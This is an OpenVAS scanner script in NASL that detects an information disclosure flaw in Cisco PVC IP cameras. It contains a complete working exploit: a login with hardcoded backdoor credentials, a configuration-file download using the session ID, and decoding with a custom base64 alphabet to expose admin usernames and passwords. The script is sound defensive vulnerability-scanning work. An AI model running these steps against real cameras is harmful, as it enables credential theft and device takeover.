###############################################################################
# OpenVAS Vulnerability Test
#
# Cisco PVC IP Cam Information Disclosure
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105106");
  script_version("2019-04-18T08:49:33+0000");
  script_name("Cisco PVC IP Cam Information Disclosure");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2019-04-18 08:49:33 +0000 (Thu, 18 Apr 2019)");
  script_tag(name:"creation_date", value:"2014-11-05 10:38:34 +0100 (Wed, 05 Nov 2014)");
  script_category(ACT_ATTACK);
  script_family("CISCO");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("lighttpd/banner");

  script_xref(name:"URL", value:"https://media.blackhat.com/us-13/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-Slides.pdf");

  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker read the config of the device including
  usernames and passwords.");

  script_tag(name:"vuldetect", value:"Send a HTTP GET request and check the response.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove
  the product or replace the product by another one.");

  script_tag(name:"summary", value:"Cisco PVC IP Camis prone to an information disclosure vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port( default:80 );
banner = get_http_banner( port:port );
if( ! banner || "Server: lighttpd" >!< banner || "IP Camera" >!< banner )
  exit( 0 );

url = "/oamp/System.xml?action=login&user=L1_admin&password=L1_51";

req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( "sessionID:" >!< buf )
  exit( 0 );

session = eregmatch( pattern:'sessionID: ([^\r\n]+)', string:buf );
if( isnull( session[1] ) )
  exit( 0 );

sess = session[1];

url = "/oamp/System.xml?action=downloadConfigurationFile";

useragent = http_get_user_agent();
host = http_host_name( port:port );

req = 'GET ' + url + ' HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'Connection: close\r\n' +
      'sessionID: ' + sess + '\r\n' +
      '\r\n';
result = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
if( result !~ "^HTTP/1\.[01] 200" )
  exit( 0 );

data = split( result, sep:'\r\n\r\n', keep:FALSE );
if( isnull( data[1] ) )
  exit( 0 );

data[1] = chomp( data[1] );
config = str_replace( string:data[1], find:'\r\n', replace:"" );

conf_decoded = base64_decode( str:config, key_str:"ACEGIKMOQSUWYBDFHJLNPRTVXZacegikmoqsuwybdfhjlnprtvxz0246813579=+" );

if( "admin_name" >< conf_decoded || "admin_password" >< conf_decoded ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );